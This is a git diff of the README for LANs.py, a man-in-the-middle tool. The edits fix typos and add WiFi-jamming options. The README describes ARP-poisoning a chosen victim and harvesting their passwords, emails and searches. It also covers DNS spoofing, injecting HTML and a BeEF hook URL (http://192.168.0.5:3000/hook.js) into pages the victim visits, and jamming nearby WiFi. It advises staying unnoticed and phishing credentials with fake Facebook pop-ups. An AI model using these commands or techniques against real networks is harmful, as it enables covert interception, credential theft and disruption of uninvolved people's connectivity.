@@ -1,3 +1,5 @@
+If you have any issues running this script I'd suggest checking out [MITMf](https://github.com/byt3bl33d3r/MITMf) which does all the same things + more. Eventually this script needs to be rewritten with net-creds as the engine.
+
 LANs.py
 ========
 *** NOTE ***
@@ -7,12 +9,12 @@ I do not maintain this anymore. I highly suggest using bettercap instead for ARP
 * Automatically find the most active WLAN users then spy on one of them and/or inject arbitrary HTML/JS into pages they visit. 
     * Individually poisons the ARP tables of the target box, the router and the DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.
 
-* Also can be used to continuosly jam nearby WiFi networks. This has an approximate range of a 1 block radius, but this can vary based off of the strength of your WiFi card. This can be fine tuned to allow jamming of everyone or even just one client. (Cannot jam WiFi and spy simultaneously) 
+* Also can be used to continuously jam nearby WiFi networks. This has an approximate range of a 1 block radius, but this can vary based off of the strength of your WiFi card. This can be fine-tuned to allow jamming of everyone or even just one client. Cannot jam WiFi and spy simultaneously.
 
 
-Prerequisites: Linux, python-scapy, python-nfqueue (nfqueue-bindings 0.4-3), aircrack-ng, python-twisted, BeEF (optional), nmap, nbtscan, and a wireless card capable of promiscuous mode if you choose not to use the -ip option
+Prerequisites: Linux, python-scapy, python-nfqueue (nfqueue-bindings 0.4-3), aircrack-ng, python-twisted, BeEF (optional), nmap, nbtscan, tcpdump, and a wireless card capable of promiscuous mode if you don't know the IP of your target. 
 
-Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.
+Tested on Kali. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.
 
 
 All options:
@@ -35,7 +37,6 @@ Python LANs.py  [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
 python LANs.py -u -p
 ```
 Active target identification which ARP spoofs the chosen target and outputs all the interesting non-HTTPS data they send or request. There's no -ip option so this will ARP scan the network, compare it to a live running promiscuous capture, and list all the clients on the network. Attempts to tag the targets with a Windows netbios name and prints how many data packets they are sending/receiving. The ability to capture data packets they send is very dependent on physical proximity and the power of your network card. Ctrl-C when you're ready and pick your target which it will then ARP spoof.
-
 
 Supports interception and harvesting of data from the following protocols: HTTP, FTP, IMAP, POP3, IRC. Will print the first 135 characters of URLs visited and ignore URLs ending in .jpg, .jpeg, .gif, .css, .ico, .js, .svg, and .woff. Will also print all protocol username/passwords entered, searches made on any site, emails sent/received, and IRC messages sent/received. Screenshot: http://i.imgur.com/kQofTYP.png 
 
@@ -84,7 +85,7 @@ python LANs.py -a -r 80.87.128.67
 ``` shell
 python LANs.py -dns eff.org
 ```
-Example 1: The -a option will spoof every single DNS request the victim makes and when used in conjuction with -r it will redirect them to -r's argument address. The victim will be redirected to stallman.org (80.87.128.67) no matter what they type in the address bar.  
+Example 1: The -a option will spoof every single DNS request the victim makes and when used in conjunction with -r it will redirect them to -r's argument address. The victim will be redirected to stallman.org (80.87.128.67) no matter what they type in the address bar.  
 
 Example 2: This will spoof the domain eff.org and subdomains of eff.org. When there is no -r argument present with the -a or -dns arguments the script will default to sending the victim to the attacker's IP address. If the victim tries to go to eff.org they will be redirected to the attacker's IP.
 
@@ -94,10 +95,17 @@ Example 2: This will spoof the domain eff.org and subdomains of eff.org. When th
 python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
 ```
 
+
 #### Jam all WiFi networks:
 
 ``` shell
-python LANs.py
+python LANs.py --jam
+```
+
+
+#### Jam just one access point (router)
+``` shell
+python Lans.py --jam --accesspoint 01:MA:C0:AD:DY
 ```
 
 ### All options:
@@ -106,36 +114,22 @@ python LANs.py
 Normal Usage:
 
   * -b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
-  
   * -c 'HTML CODE': inject arbitrary HTML code into pages the victim visits; include the quotes when selecting HTML to inject
-  
   * -d: open an xterm with driftnet to see all images they view
-  
   * -dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
-  
   * -a: Spoof every DNS response the victim makes, effectively creating a captive portal page; -r option can be used with this
-  
   * -r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN
-  
   * -u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
-  
   * -i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0
-  
   * -ip: target this IP address
-  
   * -n: performs a quick nmap scan of the target
-  
   * -na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
-  
   * -p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
-  
   * -pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument
-  
   * -rmac ROUTER_MAC: enter router MAC here if you're having trouble getting the script to automatically fetch it
-  
   * -rip ROUTER_IP: enter router IP here if you're having trouble getting the script to automatically fetch it
-  
   * -v: show verbose URLs which do not truncate at 150 characters like -u
+  * --jam: jam all or some 2.4GHz wireless access points and clients in range; use arguments below in conjunction with this argument if necessary
 
 Wifi Jamming:
 
@@ -168,5 +162,5 @@ This script uses a python nfqueue-bindings queue wrapped in a Twisted IReadDescr
 Injecting code undetected is a dicey game, if a minor thing goes wrong or the server the victim is requesting data from performs things in unique or rare way then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just wait for them to browse a few other pages. The goal is to be unnoticeable. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.
 
 ***
-* [danmcinerney.org](danmcinerney.org)
+* [danmcinerney.org](http://danmcinerney.org)
 * [![Analytics](https://ga-beacon.appspot.com/UA-46613304-2/LANs.py/README.md)](https://github.com/igrigorik/ga-beacon)
